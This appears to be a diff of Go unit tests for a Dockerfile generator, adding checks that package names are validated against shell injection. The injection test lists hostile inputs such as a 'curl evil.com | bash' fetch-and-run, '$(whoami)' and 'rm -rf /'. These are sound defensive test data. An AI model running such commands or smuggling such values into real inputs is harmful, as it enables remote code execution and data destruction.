@@ -12,9 +12,18 @@ import (
 	"github.com/giantswarm/klausctl/pkg/runtime"
 )
 
+func mustGenerateDockerfile(t *testing.T, klausImage, baseImage string, packages []string) string {
+	t.Helper()
+	df, err := GenerateDockerfile(klausImage, baseImage, packages)
+	if err != nil {
+		t.Fatalf("GenerateDockerfile() returned unexpected error: %v", err)
+	}
+	return df
+}
+
 func TestGenerateDockerfile(t *testing.T) {
 	t.Run("without packages", func(t *testing.T) {
-		df := GenerateDockerfile("klaus:latest", "golang:1.25", nil)
+		df := mustGenerateDockerfile(t, "klaus:latest", "golang:1.25", nil)
 
 		if !strings.Contains(df, "FROM klaus:latest AS klaus-source") {
 			t.Error("should contain FROM with klaus image as build stage")
@@ -49,7 +58,7 @@ func TestGenerateDockerfile(t *testing.T) {
 	})
 
 	t.Run("with packages", func(t *testing.T) {
-		df := GenerateDockerfile("klaus:v1", "python:3.12", []string{"make", "gcc"})
+		df := mustGenerateDockerfile(t, "klaus:v1", "python:3.12", []string{"make", "gcc"})
 
 		if !strings.Contains(df, "FROM klaus:v1 AS klaus-source") {
 			t.Error("should contain FROM with klaus image")
@@ -66,21 +75,79 @@ func TestGenerateDockerfile(t *testing.T) {
 	})
 
 	t.Run("empty packages slice", func(t *testing.T) {
-		df := GenerateDockerfile("klaus:latest", "golang:1.25", []string{})
+		df := mustGenerateDockerfile(t, "klaus:latest", "golang:1.25", []string{})
 
 		if strings.Contains(df, "# Additional packages") {
 			t.Error("should not contain additional packages section for empty slice")
 		}
 	})
 
-	t.Run("node.js conditional install", func(t *testing.T) {
-		df := GenerateDockerfile("klaus:latest", "golang:1.25", nil)
+	t.Run("node.js conditional install uses version constant", func(t *testing.T) {
+		df := mustGenerateDockerfile(t, "klaus:latest", "golang:1.25", nil)
 
 		if !strings.Contains(df, "command -v node") {
 			t.Error("should check for existing node.js installation")
 		}
-		if !strings.Contains(df, "nodesource.com") {
-			t.Error("should install node.js from nodesource")
+		expectedURL := fmt.Sprintf("nodesource.com/setup_%s.x", nodeSetupVersion)
+		if !strings.Contains(df, expectedURL) {
+			t.Errorf("should install node.js %s from nodesource, got:\n%s", nodeSetupVersion, df)
+		}
+	})
+
+	t.Run("rejects invalid package names", func(t *testing.T) {
+		_, err := GenerateDockerfile("klaus:v1", "golang:1.25", []string{"valid-pkg", "bad;injection"})
+		if err == nil {
+			t.Fatal("should reject invalid package names")
+		}
+		if !strings.Contains(err.Error(), "invalid package name") {
+			t.Errorf("error should mention invalid package name: %v", err)
+		}
+	})
+}
+
+func TestValidatePackages(t *testing.T) {
+	t.Run("accepts valid package names", func(t *testing.T) {
+		valid := []string{
+			"make",
+			"gcc",
+			"libssl-dev",
+			"protobuf-compiler",
+			"libc6-dev",
+			"g++",
+			"python3.12",
+		}
+		if err := ValidatePackages(valid); err != nil {
+			t.Errorf("ValidatePackages() rejected valid packages: %v", err)
+		}
+	})
+
+	t.Run("accepts nil and empty", func(t *testing.T) {
+		if err := ValidatePackages(nil); err != nil {
+			t.Errorf("ValidatePackages(nil) returned error: %v", err)
+		}
+		if err := ValidatePackages([]string{}); err != nil {
+			t.Errorf("ValidatePackages([]) returned error: %v", err)
+		}
+	})
+
+	t.Run("rejects shell injection", func(t *testing.T) {
+		invalid := []string{
+			"foo; curl evil.com | bash",
+			"$(whoami)",
+			"pkg && rm -rf /",
+			"name with spaces",
+			"UPPERCASE",
+		}
+		for _, pkg := range invalid {
+			if err := ValidatePackages([]string{pkg}); err == nil {
+				t.Errorf("ValidatePackages(%q) should have returned error", pkg)
+			}
+		}
+	})
+
+	t.Run("rejects single character names", func(t *testing.T) {
+		if err := ValidatePackages([]string{"a"}); err == nil {
+			t.Error("ValidatePackages(\"a\") should reject single-character names")
 		}
 	})
 }
@@ -193,6 +260,41 @@ func (m *mockRuntime) Logs(context.Context, string, bool, int) error {
 }
 
 func TestBuild(t *testing.T) {
+	t.Run("returns prebuilt image directly", func(t *testing.T) {
+		rt := &mockRuntime{name: "docker"}
+		tc := &config.Toolchain{
+			Image:    "my-registry.io/klaus-go:1.25",
+			Prebuilt: true,
+		}
+
+		tag, err := Build(context.Background(), rt, "klaus:v1", tc, t.TempDir())
+		if err != nil {
+			t.Fatalf("Build() returned error: %v", err)
+		}
+		if tag != "my-registry.io/klaus-go:1.25" {
+			t.Errorf("Build() should return prebuilt image directly, got %s", tag)
+		}
+		if rt.buildCalled {
+			t.Error("Build() should not call BuildImage for prebuilt toolchain")
+		}
+	})
+
+	t.Run("rejects invalid packages", func(t *testing.T) {
+		rt := &mockRuntime{name: "docker"}
+		tc := &config.Toolchain{
+			Image:    "golang:1.25",
+			Packages: []string{"valid-pkg", "bad;injection"},
+		}
+
+		_, err := Build(context.Background(), rt, "klaus:v1", tc, t.TempDir())
+		if err == nil {
+			t.Fatal("Build() should return error for invalid package names")
+		}
+		if !strings.Contains(err.Error(), "invalid package name") {
+			t.Errorf("error should mention invalid package name: %v", err)
+		}
+	})
+
 	t.Run("skips build when image exists", func(t *testing.T) {
 		dir := t.TempDir()
 		rt := &mockRuntime{name: "docker", imageExists: true}
